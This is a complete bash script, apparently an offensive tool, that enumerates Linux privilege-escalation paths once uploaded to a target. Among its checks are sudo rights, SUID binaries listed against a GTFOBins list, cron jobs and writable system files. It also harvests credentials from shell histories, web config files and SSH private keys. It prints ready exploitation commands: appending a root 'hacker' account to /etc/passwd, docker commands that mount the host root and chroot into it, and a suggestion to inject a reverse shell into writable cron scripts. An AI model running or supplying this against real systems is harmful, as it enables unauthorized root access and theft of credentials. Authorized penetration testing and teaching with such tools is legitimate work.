#!/bin/bash
# ═══════════════════════════════════════════════════════════
# Husky Privesc — Linux Privilege Escalation Enumerator
# Upload to target and run. No dependencies. Pure bash.
#
# Usage: chmod +x privesc.sh && ./privesc.sh
#        or: bash privesc.sh
# ═══════════════════════════════════════════════════════════

# Colors
if [ -t 1 ]; then
    RED='\033[91m'   GRN='\033[92m'   YEL='\033[93m'
    CYN='\033[96m'   MAG='\033[95m'   BLD='\033[1m'
    DIM='\033[2m'    RST='\033[0m'
else
    RED='' GRN='' YEL='' CYN='' MAG='' BLD='' DIM='' RST=''
fi

banner() {
    echo -e "${CYN}"
    echo '    __  ____  _______ __ ____  __'
    echo '   / / / / / / / ___// //_/\ \ \/ /'
    echo '  / /_/ / / / /\__ \/ ,<    \  /'
    echo ' / __  / /_/ /___/ / /| |   / /'
    echo '/_/ /_/\____//____/_/ |_|  /_/'
    echo -e "${RED}"
    echo '    __  _____   ________ __ __________'
    echo '   / / / /   | / ____/ //_// ____/ __ \'
    echo '  / /_/ / /| |/ /   / ,<  / __/ / /_/ /'
    echo ' / __  / ___ / /___/ /| |/ /___/ _, _/'
    echo '/_/ /_/_/  |_\____/_/ |_/_____/_/ |_|'
    echo -e "${RST}"
    echo -e "    ${BLD}P R I V E S C   E N U M E R A T O R${RST}"
    echo -e "    ${DIM}Find the path. Take the crown.${RST}"
    echo ""
}

section() { echo -e "\n  ${BLD}${CYN}═══ $1 ═══${RST}"; }
info()    { echo -e "  ${DIM}[*]${RST} $1"; }
hit_c()   { echo -e "  ${RED}[CRITICAL]${RST} $1"; }
hit_h()   { echo -e "  ${YEL}[HIGH]${RST} $1"; }
hit_m()   { echo -e "  ${CYN}[MEDIUM]${RST} $1"; }
detail()  { echo -e "    ${DIM}→${RST} $1"; }

# GTFOBins SUID/sudo exploitable binaries
GTFOBINS="aa-exec ab agetty alpine ar arj arp as ash aspell awk base32 base64 bash bridge busybox bzip2 capsh cat chmod chown chroot cmp column comm cp cpio cpulimit crash csh csplit csvtool curl cut dash date dd debugfs dialog diff dig distcc dmsetup docker ed emacs env eqn espeak expand expect file find fish flock fmt fold gawk gdb gimp git grep gtester gzip hd head hexdump highlight hping3 iconv install ionice ip ispell jjs join jq jrunscript ksh ksshell kubectl ld.so less logsave look lua make mawk more mosquitto msgattrib msgcat msgconv msgfilter msgmerge msguniq multitime mv nasm nawk ncftp nft nice nl nm nmap node nohup od openssl openvpn paste perf perl pg php pic pico pip pkexec pr python python2 python3 readelf restic rev rlwrap rpm rpmquery rsync ruby run-parts rvim sash scanmem sed setarch sftp sg shuf slsh smbclient socat sort sqlite3 ss ssh ssh-keygen ssh-keyscan sshpass start-stop-daemon stdbuf strace strings sysctl systemctl tac tail tar taskset tbl tclsh tee terraform tftp tic time timeout troff ul unexpand uniq unshare update-alternatives uudecode uuencode vagrant vi view vigr vim vimdiff vipw w3m wall watch wc wget whiptail xargs xdotool xmodmap xmore xxd yarn yash zsh apt apt-get cpan dnf dpkg easy_install ftp gcc journalctl knife man mount mysql nano nc ncat netcat npm passwd pip3 puppet service snap su sudo tmux top yum zip zypper"

is_gtfo() {
    local name=$(basename "$1")
    echo "$GTFOBINS" | tr ' ' '\n' | grep -qx "$name"
}

# Track findings
CRITS=0
HIGHS=0
MEDS=0

crit() { hit_c "$1"; ((CRITS++)); [ -n "$2" ] && detail "$2"; }
high() { hit_h "$1"; ((HIGHS++)); [ -n "$2" ] && detail "$2"; }
med()  { hit_m "$1"; ((MEDS++)); [ -n "$2" ] && detail "$2"; }

# ═══════════════════════════════════════════════════════════
banner

section "System Information"
info "Hostname: ${BLD}$(hostname)${RST}"
info "OS: ${BLD}$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)${RST}"
info "Kernel: ${BLD}$(uname -r)${RST}"
info "Arch: ${BLD}$(uname -m)${RST}"
info "User: ${BLD}$(whoami)${RST} ($(id))"

# Interesting groups
for grp in docker lxd lxc disk video adm shadow sudo wheel staff root; do
    if id -nG 2>/dev/null | grep -qw "$grp"; then
        high "User is in '${grp}' group" "Group '${grp}' may allow privilege escalation"
    fi
done

# Kernel exploits
KERN=$(uname -r)
if echo "$KERN" | grep -qE '^5\.(8|9|1[0-6])\.'; then
    med "Kernel $KERN — check DirtyPipe CVE-2022-0847"
fi

# ═══════════════════════════════════════════════════════════
section "Sudo Permissions"
SUDO_OUT=$(sudo -l 2>/dev/null)
if [ -n "$SUDO_OUT" ] && ! echo "$SUDO_OUT" | grep -qi "password\|not allowed"; then
    echo -e "  ${DIM}${SUDO_OUT}${RST}"

    # NOPASSWD check
    echo "$SUDO_OUT" | grep "NOPASSWD" | while IFS= read -r line; do
        crit "sudo NOPASSWD: $(echo "$line" | sed 's/.*NOPASSWD://')"
        # GTFOBins check
        for bin in $(echo "$line" | sed 's/.*NOPASSWD://' | tr ',' '\n'); do
            bin_clean=$(echo "$bin" | awk '{print $1}')
            bin_name=$(basename "$bin_clean")
            if is_gtfo "$bin_name"; then
                crit "GTFOBins sudo: ${bin_name}" "https://gtfobins.github.io/gtfobins/${bin_name}/#sudo"
            fi
        done
    done

    # ALL check
    if echo "$SUDO_OUT" | grep -q "(ALL)" && echo "$SUDO_OUT" | grep -q "NOPASSWD"; then
        crit "Full sudo NOPASSWD — instant root" "sudo su  OR  sudo /bin/bash"
    fi

    # LD_PRELOAD
    if echo "$SUDO_OUT" | grep -q "LD_PRELOAD\|LD_LIBRARY_PATH"; then
        crit "LD_PRELOAD/LD_LIBRARY_PATH in env_keep" "Shared library injection → root"
    fi
else
    info "sudo -l requires password or is not available"
fi

# ═══════════════════════════════════════════════════════════
section "SUID/SGID Binaries"
SUID_FILES=$(find / -perm -4000 -type f 2>/dev/null)
SUID_COUNT=$(echo "$SUID_FILES" | grep -c .)
info "Found $SUID_COUNT SUID binaries"

STANDARD="/usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/su /usr/bin/sudo /usr/bin/mount /usr/bin/umount /usr/bin/fusermount /usr/bin/fusermount3 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign"

echo "$SUID_FILES" | while IFS= read -r binary; do
    [ -z "$binary" ] && continue
    # Skip standard
    echo "$STANDARD" | tr ' ' '\n' | grep -qx "$binary" && continue

    name=$(basename "$binary")
    if is_gtfo "$name"; then
        crit "SUID GTFOBins: ${binary}" "https://gtfobins.github.io/gtfobins/${name}/#suid"
    else
        med "Non-standard SUID: ${binary}"
    fi
done

# ═══════════════════════════════════════════════════════════
section "File Capabilities"
CAPS=$(getcap -r / 2>/dev/null)
if [ -n "$CAPS" ]; then
    echo "$CAPS" | while IFS= read -r line; do
        [ -z "$line" ] && continue
        for cap in cap_setuid cap_setgid cap_dac_override cap_dac_read_search cap_sys_admin cap_sys_ptrace; do
            if echo "$line" | grep -qi "$cap"; then
                high "Dangerous capability: ${line}"
                break
            fi
        done
    done
else
    info "No capabilities found"
fi

# ═══════════════════════════════════════════════════════════
section "Cron Jobs"
if [ -r /etc/crontab ]; then
    grep -v '^#\|^$\|^SHELL\|^PATH\|^MAILTO' /etc/crontab 2>/dev/null | while IFS= read -r line; do
        [ -z "$line" ] && continue
        info "Crontab: ${line}"

        # Writable script check
        script=$(echo "$line" | awk '{for(i=7;i<=NF;i++) printf "%s ", $i}' | awk '{print $1}')
        if [ -n "$script" ] && [ -w "$script" ] 2>/dev/null; then
            crit "Writable cron script: ${script}" "Inject reverse shell into this script"
        fi

        # Wildcard check
        if echo "$line" | awk '{for(i=7;i<=NF;i++) printf "%s ", $i}' | grep -q '\*'; then
            high "Cron uses wildcard (*): ${line}" "tar wildcard injection possible"
        fi
    done
fi

# User crontabs
for dir in /var/spool/cron /var/spool/cron/crontabs /etc/cron.d; do
    [ -d "$dir" ] || continue
    for f in "$dir"/*; do
        [ -r "$f" ] && info "Cron file: ${f}"
    done
done

# ═══════════════════════════════════════════════════════════
section "Writable Files & Directories"

[ -w /etc/passwd ]  && crit "/etc/passwd is writable!" "echo 'hacker:\$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd"
[ -w /etc/shadow ]  && crit "/etc/shadow is writable!"
[ -w /etc/sudoers ] && crit "/etc/sudoers is writable!"

# PATH dirs
IFS=':' read -ra PATHDIRS <<< "$PATH"
for d in "${PATHDIRS[@]}"; do
    if [ -d "$d" ] && [ -w "$d" ] && [[ "$d" != /tmp* ]] && [[ "$d" != */home/* ]]; then
        high "Writable PATH directory: ${d}" "Binary hijacking possible"
    fi
done

# Writable service files
for dir in /etc/systemd/system /lib/systemd/system /etc/init.d; do
    [ -d "$dir" ] || continue
    find "$dir" -writable -type f 2>/dev/null | while IFS= read -r f; do
        high "Writable service file: ${f}"
    done
done

# ═══════════════════════════════════════════════════════════
section "Credential Hunting"

# History files
for hf in ~/.bash_history ~/.zsh_history ~/.mysql_history /root/.bash_history; do
    if [ -r "$hf" ] && [ -s "$hf" ]; then
        med "Readable history: ${hf} ($(wc -c < "$hf") bytes)"
        PASS_HITS=$(grep -iE 'pass|pwd|mysql|ssh|su |sudo|ftp|scp' "$hf" 2>/dev/null | head -5)
        if [ -n "$PASS_HITS" ]; then
            high "Possible creds in ${hf}:"
            echo "$PASS_HITS" | while IFS= read -r line; do detail "$line"; done
        fi
    fi
done

# Config files
for cfg in /var/www/html/wp-config.php /var/www/html/configuration.php /var/www/html/config.php /var/www/html/.env /etc/mysql/debian.cnf; do
    if [ -r "$cfg" ]; then
        high "Readable config: ${cfg}"
        grep -iE 'password|passwd|pwd|db_pass|secret' "$cfg" 2>/dev/null | head -3 | while IFS= read -r line; do
            detail "$line"
        done
    fi
done

# SSH keys
find /home/*/.ssh /root/.ssh -name 'id_*' -readable 2>/dev/null | while IFS= read -r key; do
    high "Readable SSH private key: ${key}"
done

find /home/*/.ssh /root/.ssh -name 'authorized_keys' -readable 2>/dev/null | while IFS= read -r key; do
    med "Readable authorized_keys: ${key}"
done

# Password hunt
PASS_FILES=$(find / \( -name '*.conf' -o -name '*.config' -o -name '*.ini' -o -name '*.env' -o -name '*.yml' \) -readable 2>/dev/null | head -50 | xargs grep -liE 'password|passwd|credential' 2>/dev/null | head -10)
if [ -n "$PASS_FILES" ]; then
    echo "$PASS_FILES" | while IFS= read -r f; do
        [ -n "$f" ] && info "Possible creds in: ${f}"
    done
fi

# ═══════════════════════════════════════════════════════════
section "Network & Internal Services"

# Listening ports
SS_OUT=$(ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null)
if [ -n "$SS_OUT" ]; then
    info "Listening services:"
    echo "$SS_OUT" | grep -E 'LISTEN|Local' | while IFS= read -r line; do
        echo -e "    ${DIM}${line}${RST}"
        if echo "$line" | grep -q '127.0.0.1'; then
            port=$(echo "$line" | grep -oP '127\.0\.0\.1:\K\d+' | head -1)
            case "$port" in
                3306) med "Internal MySQL on 127.0.0.1:${port}" ;;
                5432) med "Internal PostgreSQL on 127.0.0.1:${port}" ;;
                6379) med "Internal Redis on 127.0.0.1:${port}" ;;
                27017) med "Internal MongoDB on 127.0.0.1:${port}" ;;
                3000) med "Internal web app on 127.0.0.1:${port}" ;;
                8080|8443) med "Internal HTTP on 127.0.0.1:${port}" ;;
            esac
        fi
    done
fi

# ═══════════════════════════════════════════════════════════
section "Container & Docker"

[ -f /.dockerenv ] && med "Running inside a Docker container"

if [ -e /var/run/docker.sock ] && [ -r /var/run/docker.sock ]; then
    crit "Docker socket is accessible!" "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
fi

id -nG 2>/dev/null | grep -qw docker && crit "User in docker group — instant root" "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
id -nG 2>/dev/null | grep -qw lxd && crit "User in lxd group — container escape to root"

# ═══════════════════════════════════════════════════════════
section "NFS"
if [ -r /etc/exports ]; then
    grep "no_root_squash" /etc/exports 2>/dev/null | while IFS= read -r line; do
        crit "NFS no_root_squash: ${line}" "Mount from attacker, create SUID binary, run on target"
    done
fi

# ═══════════════════════════════════════════════════════════
section "Miscellaneous"

# PwnKit
[ -f /usr/bin/pkexec ] && med "pkexec present — check CVE-2021-4034 (PwnKit)"

# World-writable root-owned files
find / -writable -user root -type f 2>/dev/null | grep -vE '/proc/|/sys/|/dev/' | head -15 | while IFS= read -r f; do
    med "Root-owned writable file: ${f}"
done

# ═══════════════════════════════════════════════════════════
echo ""
echo -e "  ${BLD}${RED}══════════════════════════════════════════════════${RST}"
echo -e "  ${BLD}PRIVESC SUMMARY${RST}"
echo -e "  ${DIM}──────────────────────────────────────────────────${RST}"
echo -e "  ${RED}CRITICAL: ${CRITS}${RST}  ${YEL}HIGH: ${HIGHS}${RST}  ${CYN}MEDIUM: ${MEDS}${RST}"
echo -e "  ${BLD}${RED}══════════════════════════════════════════════════${RST}"
echo ""
